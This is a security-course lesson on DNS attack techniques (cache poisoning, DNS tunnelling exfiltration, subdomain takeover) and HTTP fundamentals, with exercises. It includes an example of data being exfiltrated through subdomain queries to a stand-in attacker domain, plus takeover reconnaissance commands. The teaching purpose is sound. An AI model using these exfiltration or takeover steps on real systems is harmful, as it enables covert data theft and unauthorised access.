---
title: "DNS as an Attack Surface + HTTP Fundamentals"
tags: [foundation, networking, dns, dns-poisoning, dns-exfiltration, subdomain-takeover,
       http, request-response, methods, headers, status-codes]
module: 01-Foundation-01
day: 4
related_topics:
  - DNS Deep Dive (Day 003)
  - HTTP Cookies and Sessions (Day 005)
  - SSRF attacks
  - DNS exfiltration in C2
---

# Day 004 — DNS Attack Surface + HTTP Fundamentals

## Goals

By the end of this lesson you will be able to:

1. Explain DNS cache poisoning — how the Kaminsky attack works and what it achieves.
2. Describe DNS-based data exfiltration and explain why it bypasses most firewalls.
3. Explain subdomain takeover — the conditions that allow it and how to find candidates.
4. Enumerate four categories of DNS attacks and map each to a real-world example.
5. Describe the complete HTTP request-response cycle at the byte level.
6. Name all nine HTTP methods and explain which are safe and which are idempotent.
7. Read and interpret any HTTP status code from memory for the major categories.
8. Identify security-relevant HTTP headers in both requests and responses.
9. Explain what makes HTTP stateless and how applications work around that limitation.

---

## Prerequisites

- [Day 003 — UDP, ICMP and DNS Deep Dive](DAY-0003-UDP-ICMP-and-DNS-Deep-Dive.md)

---

## Main Content — Part 1: DNS Attack Surface

### 1. DNS Cache Poisoning

**What it is:** Inserting a forged DNS record into a resolver's cache, redirecting traffic
for a legitimate domain to an attacker-controlled IP.

**Why it works:** Classic DNS uses UDP. UDP packets have no authentication — any host can
craft a UDP packet claiming to be from the authoritative server. The resolver accepts the
first valid-looking response it receives.

**The Kaminsky Attack (2008):** Dan Kaminsky discovered that you could poison a DNS resolver
cache by:

1. Sending a query for a random non-existent subdomain (e.g. `a1b2c3.example.com`).
2. Simultaneously flooding the resolver with forged responses, guessing the 16-bit transaction
   ID (only 65,536 possibilities).
3. Including a forged additional record (glue record) that poisoned the resolution for the
   actual target (`www.example.com`).

Before the patch, this could be done in seconds. The fix was source port randomisation,
which increased the entropy from 16 bits (65,536) to 16 + 16 bits = 32 bits (4 billion).

**DNSSEC** is the real fix — cryptographically signed DNS records that resolvers can verify.
But DNSSEC adoption remains below 40% globally as of 2026.

**Attacker use:** If you can poison a resolver cache with a forged `A` record for a target's
login page, every user using that resolver is redirected to your phishing page — with no
visible indication that anything is wrong (the URL in the browser shows the real domain).

---

### 2. DNS-Based Data Exfiltration (DNS Tunnelling)

Most firewalls allow outbound UDP port 53 — blocking DNS would break internet access. This
makes DNS the perfect covert channel.

**How it works:**

```
Data to exfiltrate: "secret_data_here"
Encoded as: "7365637265745f646174615f68657265" (hex)

Client sends DNS queries:
  7365637265.attacker-controlled-domain.com
  745f646174.attacker-controlled-domain.com
  615f686572.attacker-controlled-domain.com
  65.attacker-controlled-domain.com

Attacker's authoritative server receives all subdomains as DNS queries,
reassembles the hex, decodes: "secret_data_here"
```

**Tools:** `dnscat2`, `iodine`, `dns2tcp` all implement DNS tunnelling.

**C2 over DNS:** Beaconing malware sends command poll DNS queries to attacker DNS servers.
Responses (TXT, CNAME records) contain encoded commands. This traverses almost every
corporate firewall without triggering standard rules.

**Detection:** Unusual DNS query patterns — very long subdomains, high query rate, queries
to unusual authoritative servers, high entropy in subdomain strings (base64/hex vs words).

---

### 3. Subdomain Takeover

**What it is:** Taking control of a subdomain by exploiting a dangling DNS record pointing
to a resource the organisation no longer owns.

**Conditions for takeover:**
1. A CNAME record points from a subdomain to an external service.
2. The external service account has been deleted or the resource removed.
3. The CNAME still exists in DNS (no one cleaned it up).
4. An attacker can register the same resource name on the external service.

**Example:**

```
# DNS record still exists:
staging.example.com  CNAME  example-staging.s3-website.amazonaws.com

# The S3 bucket was deleted.
# Attacker creates a new S3 bucket named "example-staging" in any AWS account.
# Now staging.example.com serves attacker-controlled content.
# Attacker can:
#   - Serve malicious JavaScript (XSS against example.com's users)
#   - Steal cookies if cookie scope includes *.example.com
#   - Capture sensitive data from forms expecting the staging environment
#   - Pass domain verification for SSL certificates
```

**Platforms commonly involved:** GitHub Pages, Heroku, Fastly, AWS S3, Azure Blob Storage,
Netlify, Shopify, Unbounce — any platform that uses customer-supplied CNAME records.

**Finding candidates:**
```bash
# Enumerate subdomains
amass enum -passive -d example.com

# For each subdomain, check if CNAME target is registered/active
# Tools: subjack, subzy, can-i-take-over-xyz (GitHub list)
subjack -w subdomains.txt -t 100 -timeout 30 -ssl
```

**Bug bounty:** Subdomain takeover is typically a P3 to P2 finding. On a sensitive subdomain
(e.g. `auth.`, `login.`, `sso.`) it can be P1 due to cookie theft potential.

---

### 4. DNS Attack Categories — Quick Reference

| Attack | Technique | Impact |
|---|---|---|
| **Cache poisoning** | Forge authoritative responses; guess transaction ID | Redirect users transparently |
| **DNS amplification DDoS** | Spoof source IP, use ANY queries to amplifiers | Volumetric DDoS |
| **DNS exfiltration** | Encode data in subdomain labels | Bypass firewalls, exfiltrate data |
| **Subdomain takeover** | Dangling CNAME to deleted resource | XSS, cookie theft, phishing |
| **Zone transfer** | AXFR from misconfigured authoritative server | Full infrastructure map |
| **mDNS/LLMNR poisoning** | Respond to local multicast queries | NTLM hash capture (Responder) |
| **DNS rebinding** | Change DNS record TTL to 0, rebind to 127.0.0.1 | Bypass SOP, access internal services |

---

## Main Content — Part 2: HTTP Fundamentals

### 5. HTTP Overview

HTTP (Hypertext Transfer Protocol) is the application-layer protocol that powers the web.
Every web security vulnerability ultimately operates over HTTP. Understanding HTTP at the
byte level is non-negotiable for web security.

HTTP is **stateless** — each request is independent. The server retains no memory of
previous requests. This statelessness is worked around using cookies and sessions
(covered on Day 005).

HTTP runs over TCP (port 80 for plaintext, port 443 for TLS-wrapped HTTPS). With HTTP/2
it runs over a single multiplexed TCP connection. With HTTP/3 it runs over QUIC (UDP).

---

### 6. The HTTP Request

Every HTTP request has three parts:

```
REQUEST LINE
GET /api/users/1234 HTTP/1.1
▲   ▲               ▲
│   │               └── Protocol version
│   └── Request URI (path + query string)
└── Method

HEADERS
Host: api.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json
Cookie: session=abc123; _ga=GA1.2.567890

BLANK LINE (separates headers from body)

BODY (optional — used with POST, PUT, PATCH)
{"name": "Alice", "role": "admin"}
```

**The request URI can contain:**
- Path: `/api/users/1234`
- Query string: `/search?q=admin&page=2&limit=50`
- Fragment: `/page#section` (never sent to server — browser-only)

---

### 7. HTTP Methods

| Method | Semantics | Has Body | Idempotent | Safe |
|---|---|---|---|---|
| **GET** | Retrieve a resource | No | Yes | Yes |
| **POST** | Create a resource or trigger action | Yes | No | No |
| **PUT** | Full replace of a resource | Yes | Yes | No |
| **PATCH** | Partial update of a resource | Yes | No | No |
| **DELETE** | Remove a resource | Optional | Yes | No |
| **HEAD** | Like GET but response body omitted | No | Yes | Yes |
| **OPTIONS** | Discover allowed methods (CORS pre-flight) | No | Yes | Yes |
| **TRACE** | Echo the request (disabled in most servers) | No | Yes | No |
| **CONNECT** | Establish a tunnel (used for HTTPS via proxy) | No | No | No |

**Attacker relevance:**
- **Safe methods** should not cause side effects. If a `GET` request changes state (e.g.
  deletes a resource or sends money), that is a business logic flaw.
- **Idempotent** means calling the same request multiple times has the same effect as one.
  `PUT /user/1 {"name":"Bob"}` called ten times = same result as once.
- **HTTP method override:** Some servers respect `X-HTTP-Method-Override: DELETE` in a POST
  request — an attacker can use this to bypass WAF rules or firewall policies that block
  DELETE requests.

---

### 8. The HTTP Response

```
STATUS LINE
HTTP/1.1 200 OK
▲        ▲   ▲
│        │   └── Reason phrase (informational only)
│        └── Status code
└── Protocol version

HEADERS
Content-Type: application/json; charset=utf-8
Content-Length: 234
Server: nginx/1.18.0
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
Set-Cookie: session=xyz789; HttpOnly; Secure; SameSite=Strict

BLANK LINE

BODY
{"id": 1234, "name": "Alice", "role": "user"}
```

---

### 9. HTTP Status Codes

**1xx — Informational:**
- `100 Continue` — server received headers, client should send body.
- `101 Switching Protocols` — WebSocket upgrade response.

**2xx — Success:**
- `200 OK` — standard success.
- `201 Created` — resource created (POST). Should include `Location` header.
- `204 No Content` — success with no body (DELETE, or PUT with no response data).

**3xx — Redirection:**
- `301 Moved Permanently` — resource is at a new permanent URL.
- `302 Found` — temporary redirect (most common for login redirects).
- `307 Temporary Redirect` — like 302 but preserves the HTTP method.
- `308 Permanent Redirect` — like 301 but preserves the method.

**4xx — Client Error:**
- `400 Bad Request` — malformed syntax.
- `401 Unauthorized` — authentication required or invalid credentials.
- `403 Forbidden` — authenticated but not authorised.
- `404 Not Found` — resource does not exist.
- `405 Method Not Allowed` — method not supported for this endpoint.
- `408 Request Timeout` — client too slow.
- `409 Conflict` — state conflict (duplicate, version mismatch).
- `413 Payload Too Large` — body exceeds server limit.
- `422 Unprocessable Entity` — semantically invalid (validation errors).
- `429 Too Many Requests` — rate limit exceeded.

**5xx — Server Error:**
- `500 Internal Server Error` — unexpected server failure (stack traces in dev mode!).
- `502 Bad Gateway` — upstream server error.
- `503 Service Unavailable` — overloaded or in maintenance.

**Attacker relevance:**
- `401 vs 403` distinction: 401 means you are not authenticated; 403 means you are not
  authorised. A 403 response confirms the resource exists. This matters for enumeration.
- `500` responses often include stack traces, framework versions, file paths — all
  information that advances an attack.
- `200` with an error in the body = a developer mistake. The HTTP status code IS the status.
  Applications that always return 200 make automated vulnerability detection harder.

---

### 10. Security-Relevant HTTP Headers

**Request headers to manipulate:**

| Header | Attacker technique |
|---|---|
| `Host` | Host header attacks — password reset poisoning, routing manipulation |
| `X-Forwarded-For` | IP spoofing in access controls that trust this header |
| `X-Original-URL` / `X-Rewrite-URL` | Bypass path-based access controls |
| `Content-Type` | Switch from `application/json` to `text/xml` → trigger XXE |
| `Referer` | CSRF token leakage, business logic bypass |
| `Origin` | CORS policy enforcement — test with arbitrary values |

**Response headers to audit:**

| Header | What it does | Missing = vulnerability |
|---|---|---|
| `Content-Security-Policy` | Restricts script sources | XSS becomes much easier |
| `Strict-Transport-Security` | Forces HTTPS | SSL stripping possible |
| `X-Frame-Options` | Prevents iframe embedding | Clickjacking possible |
| `X-Content-Type-Options: nosniff` | Prevents MIME sniffing | Content injection possible |
| `Referrer-Policy` | Controls Referer header | Sensitive URL leakage |
| `Permissions-Policy` | Restricts browser features | Camera/mic hijacking possible |

A quick way to check security headers on any target:
```bash
curl -sI https://target.com | grep -iE 'strict|csp|x-frame|x-content|referrer'
# Or use: https://securityheaders.com
```

---

## Key Takeaways

1. **DNS cache poisoning** works by racing to provide a forged answer before the legitimate
   one arrives. DNSSEC prevents it; source port randomisation makes it harder.
2. **DNS exfiltration** encodes data in DNS query subdomains. It bypasses firewalls because
   port 53 is almost universally allowed outbound.
3. **Subdomain takeover** requires three conditions: dangling CNAME, deleted resource, and
   an external service that allows registering the same name. Check every CNAME.
4. HTTP is a **text-based request-response protocol**. Every byte is visible and modifiable.
   Burp Suite lets you modify any part of any request — you will do this from Day 022 onward.
5. **HTTP methods define intent.** If a GET changes state, that is a bug. If a DELETE can
   be triggered via a GET (no auth required), that is a high-severity bug.
6. **Status codes tell stories.** 401 vs 403 reveals whether auth is checked. 500 reveals
   server internals. Differential responses to valid vs invalid input reveal business logic.
7. **Security headers are a checklist.** Missing CSP enables XSS. Missing HSTS enables SSL
   stripping. Missing X-Frame-Options enables clickjacking. Know each one cold.

---

## Exercises

### Exercise 1 — DNS Attack Scenarios

For each scenario, identify the attack type and describe the impact:

1. An attacker registers `company-name.s3-website.amazonaws.com` after discovering that
   `app.company.com CNAME company-name.s3-website.amazonaws.com` still exists in DNS.
2. A malware sample sends queries like `dGhpcyBpcyBzZWNyZXQ.attacker.com` repeatedly.
3. An attacker on a corporate network runs Responder and replies to LLMNR queries before
   the legitimate DNS server does.
4. An attacker sends DNS `ANY` queries to open resolvers with source IP set to a target's IP.

---

### Exercise 2 — HTTP Analysis

Analyse this raw HTTP exchange and answer the questions:

```http
POST /api/v1/transfer HTTP/1.1
Host: banking.example.com
Cookie: session=abc123
Content-Type: application/json
Content-Length: 43

{"from":"acc_001","to":"acc_999","amount":500}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
Server: Apache/2.4.51 (Ubuntu)

{"status":"success","txn_id":"TXN-88991"}
```

Questions:
1. What security headers are missing from the response? What attack does each absence enable?
2. The `Server` header reveals the web server version. Why is this a problem?
3. Is this transfer endpoint idempotent? What attack does non-idempotency enable here?
4. What CSRF vulnerability conditions might exist here? What would you test next?
5. The transfer requires only a `session` cookie. What does that tell you about the
   authentication model? What attack does this suggest?

---

### Exercise 3 — Status Code Enumeration

You are testing `https://target.com/admin/users/{id}`. For each response below, describe
what you have learned about the target and what your next step is:

1. `GET /admin/users/1` → `200 OK` with JSON data.
2. `GET /admin/users/2` → `403 Forbidden`.
3. `GET /admin/users/999` → `404 Not Found`.
4. `GET /admin/users/2` via `X-Original-URL: /admin/users/2` header → `200 OK`.
5. `DELETE /admin/users/2` → `405 Method Not Allowed`.
6. `POST /admin/users/2` with `_method=DELETE` in body → `200 OK`.

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 003 — UDP, ICMP and DNS Deep Dive](DAY-0003-UDP-ICMP-and-DNS-Deep-Dive.md)*
*Next: [Day 005 — HTTP Cookies, Sessions and TLS](DAY-0005-HTTP-Cookies-Sessions-and-TLS.md)*
